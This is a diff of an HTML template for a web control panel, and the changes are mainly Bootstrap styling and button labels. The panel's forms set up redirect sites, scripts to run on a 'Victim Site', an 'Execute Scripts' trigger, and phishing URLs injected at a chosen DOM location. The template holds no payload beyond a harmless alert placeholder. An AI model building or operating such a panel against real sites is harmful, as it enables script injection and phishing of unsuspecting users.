@@ -4,7 +4,7 @@
 
 {% block contents %}
 <div class="container">
-    <h1> User: {{email}} </h1>
+    <h1 class="text-center"> User: {{email}} </h1>
     <ul class="nav nav-tabs" id="user-content" role="tablist">
         <li class="nav-item">
             <a class="nav-link active" id="settings-tab" data-toggle="tab" href="#settings" role="tab" aria-controls="settings"
@@ -29,11 +29,11 @@
     </ul>
     <div class="tab-content" id="my-tabs">
         <div class="tab-pane fade show active" id="settings" role="tabpanel" aria-labelledby="settings-tab">
-            <h2> Settings </h2>
-            <form action="{{ url_for('add_secure', email=email)}}" method="POST">
+            <h2> Redirect Users </h2>
+            <form class="form-inline" action="{{ url_for('add_secure', email=email)}}" method="POST">
                 <label for="url">Secure sites</label>
-                <input type="text" name="url" id="url" placeholder="example.com" required>
-                <input type="submit">
+                <input class="form-control ml-2" type="text" name="url" id="url" placeholder="example.com" required>
+                <button class="btn btn-success ml-2" type="submit">Add Secure Site </button>
             </form>
             <table class="table table-sm table-striped table-bordered">
                 <thead>
@@ -55,10 +55,10 @@
                     {% endfor %}
                 </tbody>
             </table>
-            <form action="{{ url_for('add_random', email=email) }}" method="POST">
+            <form class="form-inline" action="{{ url_for('add_random', email=email) }}" method="POST">
                 <label for="url">Redirect sites</label>
-                <input type="text" name="url" id="url" placeholder="example.com" required>
-                <input type="submit">
+                <input class="form-control ml-2" type="text" name="url" id="url" placeholder="example.com" required>
+                <button class="btn btn-success ml-2" type="submit">Add Redirect Site </button>
             </form>
             <table class="table table-sm table-striped table-bordered">
                 <thead>
@@ -80,18 +80,20 @@
                     {% endfor %}
                 </tbody>
             </table>
-            <hr>
+            <h2> Execute Scripts </h2>
             <div>
                 <label for="execute-script">Execute Script</label>
             </div>
             <form action="{{ url_for('add_victim', email=email) }}" method="POST">
-                <div class="form-group">
+                <div class="form-group d-block">
                     <textarea class="form-control" name="execute-script" id="execute-script" rows="4" placeholder="<script>alert('Hello');</script>"
                         required></textarea>
                 </div>
-                <label for="victim_url">Victim Site</label>
-                <input type="text" name="victim_url" id="victim_url" placeholder="example.com" required>
-                <button type="submit" class="btn btn-warning">Add</button>
+                <div class="form-inline">
+                    <label for="victim_url">Victim Site</label>
+                    <input class="form-control ml-2" type="text" name="victim_url" id="victim_url" placeholder="example.com" required>
+                    <button type="submit" class="btn btn-success ml-2">Add Victim Site</button>
+                </div>
             </form>
             <table class="table table-sm table-striped table-bordered">
                 <thead>
@@ -116,16 +118,18 @@
                 </tbody>
             </table>
             <form action="{{ url_for('execute_script', email=email) }}" method="POST">
-                <button type="submit" class="btn btn-warning">Execute</button>
+                <button type="submit" class="btn btn-warning">Execute Scripts</button>
             </form>
-            <form action="{{ url_for('add_phish', email=email) }}" method="POST">
-                <label for="url">Phish URL</label>
-                <input type="text" name="url" id="url" placeholder="example.com" required>
-                <label for="inject-loc">Location on Dom</label>
-                <input type="text" name="inject-loc" id="inject-loc" placeholder="body" required>
-                <label for="inject-class">Class</label>
-                <input type="text" name="inject-class" id="inject-class" placeholder="container" required>
-                <input type="submit">
+
+            <h2> Add Phishes </h2>
+            <form class="form-inline" action="{{ url_for('add_phish', email=email) }}" method="POST">
+                <label for="purl">Phish URL</label>
+                <input class="form-control ml-2" type="text" name="purl" id="purl" placeholder="example.com" required>
+                <label class="ml-2" for="inject-loc">Location on Dom</label>
+                <input class="form-control ml-2" type="text" name="inject-loc" id="inject-loc" placeholder="body" required>
+                <label class="ml-2" for="inject-class">Class</label>
+                <input class="form-control ml-2" type="text" name="inject-class" id="inject-class" placeholder="container">
+                <button type="submit" class="btn btn-success ml-2">Add Phish Url</button>
             </form>
             <table class="table table-sm table-striped table-bordered">
                 <thead>
